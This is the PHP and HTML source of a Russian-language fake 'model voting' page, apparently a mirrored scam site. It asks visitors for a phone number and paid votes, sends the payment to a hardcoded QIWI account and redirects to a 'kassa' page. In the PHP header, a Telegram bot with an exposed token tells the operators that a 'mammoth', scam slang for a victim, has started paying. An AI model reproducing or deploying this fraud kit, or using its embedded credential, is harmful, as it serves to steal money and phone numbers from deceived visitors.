<?php
session_start();
   if(isset($_POST['btn'])){
    //в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5892156996:AAFBvKbkwPa5rtPTCK6PCQWsOpapPKgBZog";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-1001955272769";
$_SESSION['name-model'] = 'Соня';
$_SESSION['phonenumber'] = $_POST['phone'];
$namemodels = 'Соня';
$txt = '';


//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  '💸Мамонт перешел на оплату голосов: ' => $namemodels, //name
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  header("Location:../online-kassa.php");
} else {
  echo "Error";
    }
}
 ?>
<!DOCTYPE html>
<html lang="ru">


<!-- Mirrored from bestmodelss.ru/profile/14 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:30:48 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>    Голосование
</title>
    <link rel="icon" href="../images/icon.png">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../../maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
<!--    <script src="http://code.jivosite.com/widget/Gm8J010U0z" async></script>-->
    <script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="a260b8d9-0d22-4be6-b727-69c208065c8c";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>

</head>

<body>
    <header id="header" class="header menu">
        <div class="container">
            <div class="row justify-content-md-center">
                <div class="col main__menu">
                    <a href="../index.php">Главная</a>
                </div>
            </div>
        </div>
    </header>

        <section class="profile">
        <div class="container profile-outline">
            <div class="row">
                <div class="col-lg-8">
                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="1" class=""></li>
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="2" class=""></li>
                                                    </ol>
                        <div class="carousel-inner">
                                                    <div class="carousel-item active">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/14/5ffcfa1ea09d78.40722780.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                    <div class="carousel-item ">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/14/5ffcfa1ea0e987.95987057.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                    <div class="carousel-item ">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/14/5ffcfa1ea15486.77332186.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                </div>
                        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                            <span class="visually-hidden"></span>
                        </a>
                        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
                            <span class="visually-hidden"></span>
                        </a>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="profile-description">
                        <table class="table table-sm table-borderless">
                            <tbody>
                                <tr>
                                    <th>Имя:</th>
                                <td>Соня</td>
                                </tr>
                                <tr>
                                    <th>Возраст:</th>
                                    <td>25</td>
                                </tr>
                                <tr>
                                    <th>Рост:</th>
                                    <td>170</td>
                                </tr>
                            </tbody>
                        </table>

                        <div class="description__text">
                            <p>Хобби: Игра в КВН, рисование

Интересный факт: Окончила музыкальную школу по классу флейта, изучаю китайский язык</p>
                        </div>
                        <div class="price">
                            Цена: 0 RUB
                        </div>
                        
                        <div class="voting">
                            <form method="post" enctype="multipart/form-data " id="qm-form" action="https://qiwi.com/transfer/form.action" target="_blank">
                                <input type="hidden" name="_token" value="Adck8rYdtFVaaHJAagAMBFAE0gZ7mSO9BUWjmZK8">                                <input class="hide" type="text" name="name" value="Соня">
                                <input class="hide" type="text" name="id" value="14">
                                    <div style="margin-bottom: 10px;">
                                        <label for="post-phone" class="inp">
                                            <input required name="phone" class="phome-number" type='tel' id="tel" placeholder="&nbsp;" />
                                            <span class="label">Номер телефона</span>
                                            <span class="focus-bg"></span>
                                        </label>
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <label for="post-phone" class="inp">
                                            <input required name="votes" class="count-votes" onDrag="return false" onDrop="return false" onPaste="return false" class="vote" type='text' maxlength="4" id="inp" placeholder="&nbsp;" onkeypress='validate(event)' />
                                            <span class="label">Количество голосов</span>
                                            <span class="focus-bg"></span>
                                        </label>
                                    </div>
                                    <input type="hidden" name="currency" value="RUB">
                                    <input type="hidden" id="amountInput" name="amountInteger" value="" amountinteger="">
                                    <input type="hidden" name="amountFraction" value="1000" amountfraction="">
                                    <input type="hidden" name="extra['account']" value="79917285343">
                                    <input type="hidden" name="extra['comment']" value="Оплата голосов 'Соня'">
                                    <button type="submit" d="submitter" name="btn" form="qm-form" class="design__btn unselectable btn-voting in-category-only">Проголосовать <i class="fa fa-heart"></i></button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script type="text/javascript">
        function validate(evt) {
            var theEvent = evt || window.event;

            if (theEvent.type === 'paste') {
                key = event.clipboardData.getData('text/plain');
            } else {
                var key = theEvent.keyCode || theEvent.which;
                key = String.fromCharCode(key);
            }

            var regex = /[0-9]|\./;
            if ((!regex.test(key)) || ($('.count-votes').val() == '' && key == '0') || (key == '.') || (window.getSelection() != '' && key == '0')) {
                theEvent.returnValue = false;
                if (theEvent.preventDefault) theEvent.preventDefault();
            }
        }
    </script>

    <footer class="foteer">
        <!-- <div class="container">
            <div>
                <p class="test">© 2020</p>
            </div>
        </div>
        -->
    </footer>
    <script src="../js/app.js"></script>
    <link href="../css/app.css" rel="stylesheet" type="text/css">
</body>


<!-- Mirrored from bestmodelss.ru/profile/14 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:30:48 GMT -->
</html>